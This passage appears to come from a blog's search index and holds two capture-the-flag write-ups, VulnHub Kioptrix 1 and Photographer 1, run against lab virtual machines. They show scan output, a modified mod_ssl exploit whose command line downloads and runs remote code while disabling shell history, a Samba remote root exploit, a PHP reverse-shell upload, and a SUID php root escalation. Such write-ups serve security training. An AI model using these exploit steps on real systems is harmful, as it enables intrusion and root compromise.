(port 36794/udp): CLEAN (Timeout)| Check 4 (port 37017/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked|_smb2-time: Protocol negotiation failed (SMB2)|_smb2-security-mode: Couldn&#39;t establish a SMBv2 connection.| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| KIOPTRIX&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| KIOPTRIX&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| KIOPTRIX&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| MYGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| MYGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| MYGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00TRACEROUTEHOP RTT ADDRESS1 0.43 ms 192.168.1.104Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Jan 23 14:24:41 2022 -- 1 IP address (1 host up) scanned in 31.73 secondsTCP/80 (HTTP)FFUF/FEROX┌──(root💀kali)-[~/vulnHub/kioptrix1]└─# ffuf -u http://192.168.1.104/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &quot;.html,.txt,.php&quot; -fw 20 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.1.104/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 20________________________________________________ [Status: 200, Size: 2890, Words: 453, Lines: 87]index.html [Status: 200, Size: 2890, Words: 453, Lines: 87]index.html [Status: 200, Size: 2890, Words: 453, Lines: 87]manual [Status: 301, Size: 294, Words: 19, Lines: 10]mrtg [Status: 301, Size: 292, Words: 19, Lines: 10]test.php [Status: 200, Size: 27, Words: 2, Lines: 6]usage [Status: 301, Size: 293, Words: 19, Lines: 10]:: Progress: [18460/18460] :: Job [1/1] :: 6129 req/sec :: Duration: [0:00:06] :: Errors: 0 :: test.phpNikto┌──(root💀kali)-[~/vulnHub/kioptrix1]└─# nikto -ask=no -h http://192.168.1.104:80 2&amp;gt;&amp;amp;1 | tee &quot;/root/vulnHub/kioptrix1/192.168.1.104/scans/tcp80/tcp_80_http_nikto.txt&quot;- Nikto v2.1.6---------------------------------------------------------------------------+ Target IP: 192.168.1.104+ Target Hostname: 192.168.1.104+ Target Port: 80+ Start Time: 2022-01-23 15:08:22 (GMT8)---------------------------------------------------------------------------+ Server: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep 6 11:12:46 2001+ The anti-clickjacking X-Frame-Options header is not present.+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution. CAN-2002-0392.+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi. CAN-2003-0542.+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST+ ///etc/hosts: The server install allows reading of any system file by adding an extra &#39;/&#39; to the URL.+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).+ OSVDB-3268: /manual/: Directory indexing found.+ OSVDB-3092: /manual/: Web server manual found.+ OSVDB-3268: /icons/: Directory indexing found.+ OSVDB-3233: /icons/README: Apache default file found.+ OSVDB-3092: /test.php: This might be interesting...+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.+ /shell?cat+/etc/hosts: A backdoor was identified.+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host+ End Time: 2022-01-23 15:08:47 (GMT8) (25 seconds)---------------------------------------------------------------------------+ 1 host(s) tested mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell wordpress is a false positiveTCP/443 (HTTPS)FFUF The same as TCP/80Nikto The same as TCP/80TCP/139,445 (SMB)Enum4linux ------------------------------------------ OS Information via RPC for 192.168.1.104 ------------------------------------------[*] Enumerating via unauthenticated SMB session on 139/tcp[+] Found OS information via SMB[*] Enumerating via &#39;srvinfo&#39;[+] Found OS information via &#39;srvinfo&#39;[+] After merging OS information we have the following result: OS: Linux/Unix (Samba 2.2.1a) OS version: &#39;4.5&#39; OS release: not supported OS build: not supported Native OS: Unix Native LAN manager: Samba 2.2.1a Platform id: &#39;500&#39; Server type: &#39;0x9a03&#39; Server type string: Wk Sv PrQ Unx NT SNT Samba Server Samba 2.2.1aSMBMap + Crackmapexec┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104]└─# crackmapexec smb $ip -u &#39;&#39; -p &#39;&#39; --shares┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104]└─# smbmap -H $ip[!] 445 not open on 192.168.1.104...Initial FootholdTCP/80 (HTTP) - No Exploits Found View enumerated directories test.php php code does not work manual, mrtg, usage Redirected to localhost TCP/443 (HTTPS) - No Exploits Found View enumerated directories test.php php code does not work manual, mrtg, usage Redirected to localhost Search for mod_ssl 2.8.7 exploits ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl] └─# searchsploit mod_ssl 2.8 Apache mod_ssl &amp;lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow unix/remote/21671.c Apache mod_ssl &amp;lt; 2.8.7 OpenSSL - &#39;OpenFuck.c&#39; Remote Buffer Overflow unix/remote/21671.c Apache mod_ssl &amp;lt; 2.8.7 OpenSSL - &#39;OpenFuckV2.c&#39; Remote Buffer Overflow (1) unix/remote/764.c ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl] └─# gcc 764.c -o exploit 764.c:644:31: error: ‘SSL2_MAX_CONNECTION_ID_LENGTH’ undeclared here (not in a function); did you mean ‘SSL_MAX_SSL_SESSION_ID_LENGTH’? However, none of them work w/o any modification Fixing the exploit Guide I followed Line 24: Add #include &amp;lt;openssl/rc4.h&amp;gt; #include &amp;lt;openssl/md5.h&amp;gt; #define SSL2_MT_ERROR 0 #define SSL2_MT_CLIENT_FINISHED 3 #define SSL2_MT_SERVER_HELLO 4 #define SSL2_MT_SERVER_VERIFY 5 #define SSL2_MT_SERVER_FINISHED 6 #define SSL2_MAX_CONNECTION_ID_LENGTH 16 Line 673: Replace COMMAND 2 #define COMMAND2 &quot;unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \\n&quot; Line 970: Add const unsigned char *p, *end; Line 972: Remove unsigned char *p, *end; Line 1079: Replace if (EVP_PKEY_get1_RSA(pkey) == NULL) { Line 1085: Replace encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&amp;gt;master_key, &amp;amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING); Install apt-get install libssl-dev Compile gcc -o 764 764.c -lcrypto Run the exploit NMAP Scan 80/tcp open http syn-ack ttl 64 Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b) |_http-server-header: Apache/1.3.20 (Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b | http-methods: | Supported Methods: GET HEAD OPTIONS TRACE |_ Potentially risky methods: TRACE Red-Hat/Linux Apache/1.3.20 Exploit ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl] └─# gcc -o 764 764.c -lcrypto ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl] └─# ./764 | grep &quot;RedHat&quot; | grep &quot;1.3.20&quot; 0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1 0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2 ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/mod_ssl] └─# ./764 0x6b $ip 443 -c 50 Connection... 50 of 50 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8258 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ ace-kmod.c; rm ptrace-kmod.c; ./p; wget 192.168.1.1/ptrace-kmod.c; gcc -o p ptr --04:45:09-- http://192.168.1.1/ptrace-kmod.c =&amp;gt; `ptrace-kmod.c&#39; Connecting to 192.168.1.1:80... connected! HTTP request sent, awaiting response... 200 OK Length: 3,921 [text/x-csrc] 0K ... 100% @ 3.74 MB/s 04:45:09 (3.74 MB/s) - `ptrace-kmod.c&#39; saved [3921/3921] [+] Attached to 19340 [+] Waiting for signal [+] Signal caught [+] Shellcode placed at 0x4001189d [+] Now wait for suid shell... whoami root TCP/139,445 (SMB) - Samba 2.2.1a Exploit Search for Samba 2.2.1a exploits ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit] └─# searchsploit samba 2.2 ----------------------------------------------------------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------- Samba &amp;lt; 2.2.8 (Linux/BSD) - Remote Code Execution | multiple/remote/10.c ----------------------------------------------------------------------------------- Compile Exploit &amp;amp; Run ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba] └─# searchsploit -m multiple/remote/10.c Exploit: Samba &amp;lt; 2.2.8 (Linux/BSD) - Remote Code Execution URL: https://www.exploit-db.com/exploits/10 Path: /usr/share/exploitdb/exploits/multiple/remote/10.c File Type: C source, ASCII text Copied to: /root/vulnHub/kioptrix1/192.168.1.104/exploit/samba/10.c ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba] └─# gcc 10.c -o exploit ┌──(root💀kali)-[~/vulnHub/kioptrix1/192.168.1.104/exploit/samba] └─# ./exploit -b 0 -c 192.168.1.1 $ip samba-2.2.8 &amp;lt; remote root exploit by eSDee (www.netric.org|be) -------------------------------------------------------------- + Bruteforce mode. (Linux) + Host is running samba. + Worked! -------------------------------------------------------------- *** JE MOET JE MUIL HOUWE Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown uid=0(root) gid=0(root) groups=99(nobody) whoami Privilege EscalationRoot - Via Already root by running the service exploits" }, { "title": "Vulnhub - Photographer 1", "url": "/posts/Photographer-1/", "categories": "Vulnhub, Linux", "tags": "tcp/139-445-smb/fileshare, tcp/80-http/web-app-cms-exploit, linux-priv-esc/suid/gtfo-bin", "date": "2022-02-02 00:00:00 +0800", "snippet": "ReconNMAP Complete Scan# Nmap 7.92 scan initiated Thu Feb 3 15:41:03 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/Photographer-1/192.168.110.10/scans/_full_tcp_nmap.txt -oX /root/vulnHub/Photographer-1/192.168.110.10/scans/xml/_full_tcp_nmap.xml 192.168.110.10Nmap scan report for 192.168.110.10Host is up, received arp-response (0.0029s latency).Scanned at 2022-02-03 15:41:04 +08 for 23sNot shown: 65531 closed tcp ports (reset)PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: Photographer by v1n1v131r4139/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)445/tcp open netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)8000/tcp open http syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-open-proxy: Proxy might be redirecting requests|_http-generator: Koken 0.22.24| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: daisa ahomi|_http-trane-info: Problem with XML parsing of /evox/aboutMAC Address: 08:00:27:3D:3C:F1 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBOS:8727%P=x86_64-pc-linux-gnu)SEQ(SP=FD%GCD=1%ISR=110%TI=Z%CI=I%II=I%TS=A)OOS:PS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4SOS:T11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EOS:CN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=S+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=OS:)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%S=OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(ROS:=N)IE(R=Y%DFI=N%TG=40%CD=S)Uptime guess: 38.446 days (since Mon Dec 27 04:58:46 2021)Network Distance: 1 hopTCP Sequence Prediction: Difficulty=253 (Good luck!)IP ID Sequence Generation: All zerosService Info: Host: PHOTOGRAPHERHost script results:|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -2s| p2p-conficker: | Checking for Conficker.C or higher...| Check 1 (port 41522/tcp): CLEAN (Couldn&#39;t connect)| Check 2 (port 61616/tcp): CLEAN (Couldn&#39;t connect)| Check 3 (port 34750/udp): CLEAN (Failed to receive data)| Check 4 (port 36043/udp): CLEAN (Timeout)|_ 0/4 checks are positive: Host is CLEAN or ports are blocked| smb-os-discovery: | OS: Windows 6.1 (Samba 4.3.11-Ubuntu)| Computer name: photographer| NetBIOS computer name: PHOTOGRAPHER\\x00| Domain name: \\x00| FQDN: photographer|_ System time: 2022-02-03T02:41:20-05:00| smb-security-mode: | account_used: guest| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-time: | date: 2022-02-03T07:41:20|_ start_date: N/A| nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; (unknown)| Names:| PHOTOGRAPHER&amp;lt;00&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| PHOTOGRAPHER&amp;lt;03&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| PHOTOGRAPHER&amp;lt;20&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| \\x01\\x02__MSBROWSE__\\x02&amp;lt;01&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;00&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1d&amp;gt; Flags: &amp;lt;unique&amp;gt;&amp;lt;active&amp;gt;| WORKGROUP&amp;lt;1e&amp;gt; Flags: &amp;lt;group&amp;gt;&amp;lt;active&amp;gt;| Statistics:| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00| 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00|_ 00 00 00 00 00 00 00 00 00 00 00 00 00 00| smb2-security-mode: | 3.1.1: |_ Message signing enabled but not requiredTRACEROUTEHOP RTT ADDRESS1 2.94 ms 192.168.110.10Read data files from: /usr/bin/../share/nmapOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Feb 3 15:41:27 2022 -- 1 IP address (1 host up) scanned in 24.42 secondsTCP/80 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Photographer-1]└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php&#39; -fc 403 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.10/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response status: 403________________________________________________ [Status: 200, Size: 5711, Words: 296, Lines: 190]assets [Status: 301, Size: 317, Words: 20, Lines: 10]elements.html [Status: 200, Size: 19831, Words: 1279, Lines: 459]generic.html [Status: 200, Size: 4243, Words: 389, Lines: 83]images [Status: 301, Size: 317, Words: 20, Lines: 10]index.html [Status: 200, Size: 5711, Words: 296, Lines: 190]index.html [Status: 200, Size: 5711, Words: 296, Lines: 190]:: Progress: [18460/18460] :: Job [1/1] :: 1896 req/sec :: Duration: [0:00:08] :: Errors: 0 ::TCP/139,445 (SMB)Enum4linux---------------------------------------------------------------------------| Users on 192.168.110.10 via RID cycling (RIDS: 500-550,1000-1050) |---------------------------------------------------------------------------[I] Found new SID: S-1-22-1[I] Found new SID: S-1-5-21-3693138109-3993630114-3057792995[I] Found new SID: S-1-5-32[+] Enumerating users using SID S-1-22-1 and logon username &#39;&#39;, password &#39;&#39;S-1-22-1-1000 Unix User\\daisa (Local User)Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932.S-1-22-1-1001 Unix User\\agi (Local User)Use of uninitialized value $user_info in pattern match (m//) at ./enum4linux.pl line 932. daisa agiCrackmapexec┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10]└─# crackmapexec smb $ip -u &#39;&#39; -p &#39;&#39; --sharesSMB 192.168.110.10 445 PHOTOGRAPHER [*] Windows 6.1 (name:PHOTOGRAPHER) (domain:) (signing:False) (SMBv1:True)SMB 192.168.110.10 445 PHOTOGRAPHER [+] \\: SMB 192.168.110.10 445 PHOTOGRAPHER [+] Enumerated sharesSMB 192.168.110.10 445 PHOTOGRAPHER Share Permissions RemarkSMB 192.168.110.10 445 PHOTOGRAPHER ----- ----------- ------SMB 192.168.110.10 445 PHOTOGRAPHER print$ Printer DriversSMB 192.168.110.10 445 PHOTOGRAPHER sambashare READ Samba on UbuntuSMB 192.168.110.10 445 PHOTOGRAPHER IPC$ IPC Service (photographer server (Samba, Ubuntu)) sambashare, READSMBMap┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10]└─# smbmap -H $ip -u &#39;&#39; -p &#39;&#39;[+] Guest session IP: 192.168.110.10:445 Name: 192.168.110.10 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers sambashare READ ONLY Samba on Ubuntu IPC$ NO ACCESS IPC Service (photographer server (Samba, Ubuntu)) sambashare, READTCP/8000 (HTTP)FFUF No directories enumeratedInitial FootholdTCP/80 (HTTP) - No Exploit Prcoeed to index.html Could not find any vulnerabilities TCP/139,445 (SMB) Access sambashare ┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/loot/smb] └─# smbclient //$ip/sambashare Enter WORKGROUP\\root&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&amp;gt; ls . D 0 Tue Jul 21 09:30:07 2020 .. D 0 Tue Jul 21 17:44:25 2020 mailsent.txt N 503 Tue Jul 21 09:29:40 2020 wordpress.bkp.zip N 13930308 Tue Jul 21 09:22:23 2020 278627392 blocks of size 1024. 264268400 blocks available smb: \\&amp;gt; put test NT_STATUS_ACCESS_DENIED opening remote file \\test smb: \\&amp;gt; No write access Download all files ┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/loot/smb] └─# smbclient //$ip/sambashare -c &#39;prompt;recurse;mget *&#39; Enter WORKGROUP\\root&#39;s password: getting file \\mailsent.txt of size 503 as mailsent.txt (28.9 KiloBytes/sec) (average 28.9 KiloBytes/sec) getting file \\wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (45346.0 KiloBytes/sec) (average 42915.8 KiloBytes/sec) View files wordpress.bkp.zip Standard wordpress CMS files, nothing suspicious mailsent.txt List of possible credentials till this point Usernames: agi daisa Passwords Variants of babygirl TCP/8000 (HTTP) - Koken CMS File Upload Proceed to http://192.168.110.10 Koken 0.22.24 After googling about Koken CMS, its login page is at /admin Successfully login w/ daisa@photographer.com:babygirl Search exploits for Koken 0.22.24 Exploit Title Path Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated) php/webapps/48706.txt Try php/webapps/48706.txt Rename php-reverse-shell.php to php-reverse-shell.php.jpg ┌──(root💀kali)-[~/vulnHub/Photographer-1/192.168.110.10/exploit/koken] └─# mv php-reverse-shell.php php-reverse-shell.php.jpg Login w/ daisa@photographer.com:babygirl Turn on burp to intercept file upload Upload file Kokan CMS Dashboard -&amp;gt; Library -&amp;gt; Content -&amp;gt; Bottom Right On burp, rename file to image.php Hover over Download Execute shell @ 192.168.110.10:8000/storage/originals/1e/32/image.php User Flag www-data@photographer:/home/daisa$ cat user.txt d41d8cd98f00b204e9800998ecf8427e Privilege EscalationRoot - Via SUID Binary (GTFO Bins) Since there is a CMS, we can obtain more credentials by finding its SQL configuration file. Google Find SQL Configuration file www-data@photographer:/var/www/html/koken$ find $(pwd) 2&amp;gt;/dev/null | grep database.php /var/www/html/koken/app/application/config/database.php /var/www/html/koken/storage/configuration/database.php View /var/www/html/koken/storage/configuration/database.php kokenuser:user_password_here Access MySQL MariaDB [koken]&amp;gt; SELECT password,email FROM koken_users; +--------------------------------------------------------------+------------------------+ | password | email | +--------------------------------------------------------------+------------------------+ | $2a$08$ruF3jtzIEZF1JMy/osNYj.ibzEiHWYCE4qsC6P/sMBZorx2ZTSGwK | daisa@photographer.com | +--------------------------------------------------------------+------------------------+ 1 row in set (0.01 sec) No new credentials Linpeas ╔═══════════════════╗ ═════════════════════════════════════════╣ Interesting Files ╠═════════════════════════════════════════ ╚═══════════════════╝ ╔══════════╣ SUID - Check easy privesc, exploits and write perms ╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 27 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-sr-x 1 root root 11K Oct 25 2018 /usr/lib/xorg/Xorg.wrap -rwsr-xr-x 1 root root 109K Jul 10 2020 /usr/lib/snapd/snap-confine ---&amp;gt; Ubuntu_snapd&amp;lt;2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304) -rwsr-xr-x 1 root root 419K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 19K Mar 18 2017 /usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox -rwsr-xr-x 1 root root 15K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-- 1 root dip 386K Feb 11 2020 /usr/sbin/pppd ---&amp;gt; Apple_Mac_OSX_10.4.8(05-2007) -rwsr-xr-x 1 root root 23K Mar 27 2019 /usr/bin/pkexec ---&amp;gt; Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485) -rwsr-xr-x 1 root root 53K May 16 2017 /usr/bin/passwd ---&amp;gt; Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997) -rwsr-xr-x 1 root root 39K May 16 2017 /usr/bin/newgrp ---&amp;gt; HP-UX_10.20 -rwsr-xr-x 1 root root 74K May 16 2017 /usr/bin/gpasswd -rwsr-xr-x 1 root root 4.7M Jul 9 2020 /usr/bin/php7.2 (Unknown SUID binary) -rwsr-xr-x 1 root root 134K Jan 31 2020 /usr/bin/sudo ---&amp;gt; check_if_the_sudo_version_is_vulnerable -rwsr-xr-x 1 root root 40K May 16 2017 /usr/bin/chsh -rwsr-xr-x 1 root root 49K May 16 2017 /usr/bin/chfn ---&amp;gt; SuSE_9.3/10 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping -rwsr-xr-x 1 root root 31K Jul 12 2016 /bin/fusermount -rwsr-xr-x 1 root root 40K May 16 2018 /bin/mount ---&amp;gt; Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8 -rwsr-xr-x 1 root root 44K May 7 2014 /bin/ping6 -rwsr-xr-x 1 root root 27K May 16 2018 /bin/umount ---&amp;gt; BSD/Linux(08-1996) -rwsr-xr-x 1 root root 40K May 16 2017 /bin/su /usr/bin/php7.2, has a GTFOBins entry Exploit www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot; www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec(&#39;/bin/sh&#39;, [&#39;-p&#39;]);&quot; Root flag rootbash-4.3# cd /root rootbash-4.3# ls proof.txt rootbash-4.3# cat proof.txt .:/://::::///:-` -/++:+`:--:o: oo.-/+/:` -++-.`o++s-y:/s: `sh:hy`:-/+:` :o:``oyo/o`. ` ```/-so:+--+/` -o:-`yh//. `./ys/-.o/ ++.-ys/:/y- /s-:/+/:/o` o/ :yo-:hNN .MNs./+o--s` ++ soh-/mMMN--.` `.-/MMMd-o:+ -s .y /++:NMMMy-.`` ``-:hMMMmoss: +/ s- hMMMN` shyo+:. -/+syd+ :MMMMo h h `MMMMMy./MMMMMd: +mMMMMN--dMMMMd s. y `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm +- h dMMMMd:```` `mmNh ```./NMMMMs o. y. /MMMMNmmmmd/ `s-:o sdmmmmMMMMN. h` :o sMMMMMMMMs. -hMMMMMMMM/ :o s: `sMMMMMMMo - . `. . hMMMMMMN+ `y` `s- +mMMMMMNhd+h/+h+dhMMMMMMd: `s- `s: --.sNMMMMMMMMMMMMMMMMMMmo/. -s. /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o` .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o- ./+:`:yh:dso/.+-++++ss+h++.:++- -/+/-:-/y+/d:yh-o:+--/+/:` `-///////////////:` 